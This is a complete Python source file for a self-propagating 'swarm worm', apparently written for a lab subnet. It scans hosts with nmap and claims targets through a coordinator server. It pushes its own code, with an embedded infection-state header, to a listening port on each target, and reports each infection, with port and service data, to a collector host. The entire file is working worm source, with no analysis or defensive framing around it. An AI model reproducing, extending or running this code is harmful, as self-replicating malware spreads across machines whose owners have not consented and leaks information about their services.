import socket
import nmap
import json
import os
import time
import sys
from datetime import datetime

COLLECTOR_IP = "192.168.100.10"
COLLECTOR_PORT = 8888
COORDINATOR_PORT = 7777
WORM_PORT = 9999
ALL_IPS = [f"192.168.100.{i}" for i in range(11, 16)]

def get_my_ip():
    print("[*] Determining local IP...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.100.1", 80))
    ip = s.getsockname()[0]
    s.close()
    print(f"[+] My IP: {ip}")
    return ip

def check_and_claim(ip):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((COLLECTOR_IP, COORDINATOR_PORT))
        s.sendall(json.dumps({"ip": ip}).encode())
        s.shutdown(socket.SHUT_WR)
        data = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
        s.close()
        result = data.decode().strip()
        return result == "clean"
    except Exception as e:
        print(f"[-] Coordinator error: {e}")
        return False

def scan_ports(ip):
    print(f"[*] Scanning ports on {ip}...")
    nm = nmap.PortScanner()
    nm.scan(hosts=ip, arguments='-sV -T4 -p 21,22,80,443,3306,8080')
    open_ports = []
    services = {}
    if ip in nm.all_hosts():
        for port in [21, 22, 80, 443, 3306, 8080]:
            try:
                if nm[ip]['tcp'][port]['state'] == 'open':
                    open_ports.append(port)
                    services[port] = nm[ip]['tcp'][port]['name']
            except:
                pass
    print(f"[+] {ip} — ports: {open_ports}")
    return open_ports, services

def send_log(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((COLLECTOR_IP, COLLECTOR_PORT))
        s.sendall(json.dumps(data).encode())
        s.close()
        print("[+] Log sent")
    except:
        print("[-] Failed to send log")

def spread(target_ip, my_ip, hop_count, infected):
    print(f"[!] Spreading: {my_ip} → {target_ip}")
    try:
        with open(__file__, "r") as f:
            lines = f.readlines()
        if lines[0].startswith("# STATE:"):
            lines = lines[1:]
        worm_code = "".join(lines)

        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected,
            "is_drone": True
        })
        final_code = f"# STATE:{state}\n" + worm_code

        start = time.time()
        s = socket.socket()
        s.settimeout(5)
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()
        elapsed = round(time.time() - start, 2)
        print(f"[+] Spread successful ({elapsed}s)")
        return True, elapsed

    except Exception as e:
        print(f"[-] Spread failed: {target_ip} — {e}")
        return False, 0

def launch_first_two(my_ip):
    print("[*] Kali launching first 2 drones simultaneously...")
    with open(__file__, "r") as f:
        lines = f.readlines()
    if lines[0].startswith("# STATE:"):
        lines = lines[1:]
    worm_code = "".join(lines)

    for ip in ALL_IPS[:2]:  # only .11 and .12
        try:
            # claim in coordinator first
            if not check_and_claim(ip):
                print(f"[-] Could not claim {ip}")
                continue

            state = json.dumps({
                "source_ip": my_ip,
                "hop_count": 1,
                "infected": [my_ip, ip],
                "is_drone": True
            })
            final_code = f"# STATE:{state}\n" + worm_code

            s = socket.socket()
            s.settimeout(5)
            s.connect((ip, WORM_PORT))
            s.sendall(final_code.encode())
            s.close()
            print(f"[+] Drone launched on {ip}")

            log = {
                "worm_type": "W3_swarm",
                "source_ip": my_ip,
                "infected_ip": ip,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hop_count": 1,
                "live_hosts_found": ALL_IPS,
                "open_ports": [],
                "services": {},
                "spread_to": ip,
                "spread_success": True,
                "time_to_spread": 0
            }
            send_log(log)

        except Exception as e:
            print(f"[-] Failed to launch on {ip} — {e}")

def drone_run(my_ip, source_ip, hop_count, infected):
    print(f"[*] Drone active on {my_ip}")

    # keep going until no targets left
    while True:
        target = None
        for ip in ALL_IPS:
            if ip in infected:
                continue
            if ip == my_ip:
                continue
            print(f"[*] Checking {ip} with coordinator...")
            if check_and_claim(ip):
                target = ip
                print(f"[+] Claimed {ip} — attacking")
                break
            else:
                print(f"[~] {ip} already claimed — skipping")
            time.sleep(1)

        if not target:
            print("[!] No targets left — drone done")
            break

        open_ports, services = scan_ports(target)
        hop_count += 1
        success, elapsed = spread(target, my_ip, hop_count, infected)

        if success:
            log = {
                "worm_type": "W3_swarm",
                "source_ip": my_ip,
                "infected_ip": target,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hop_count": hop_count,
                "live_hosts_found": ALL_IPS,
                "open_ports": open_ports,
                "services": services,
                "spread_to": target,
                "spread_success": True,
                "time_to_spread": elapsed
            }
            send_log(log)
            infected.append(target)
            print(f"[+] Infection chain: {infected}")

def main():
    if os.path.exists("/tmp/w3_lock"):
        os.remove("/tmp/w3_lock")
    open("/tmp/w3_lock", "w").close()

    print("================================")
    print("      W3 SWARM WORM START       ")
    print("================================")

    my_ip = get_my_ip()

    try:
        with open(__file__, "r") as f:
            first_line = f.readline()
        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]
            is_drone = state.get("is_drone", False)
            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}")
        else:
            raise ValueError("no state")
    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        is_drone = False
        print("[+] Fresh start on Kali")

    if is_drone:
        drone_run(my_ip, source_ip, hop_count, infected)
    else:
        launch_first_two(my_ip)

    os.remove("/tmp/w3_lock")

main()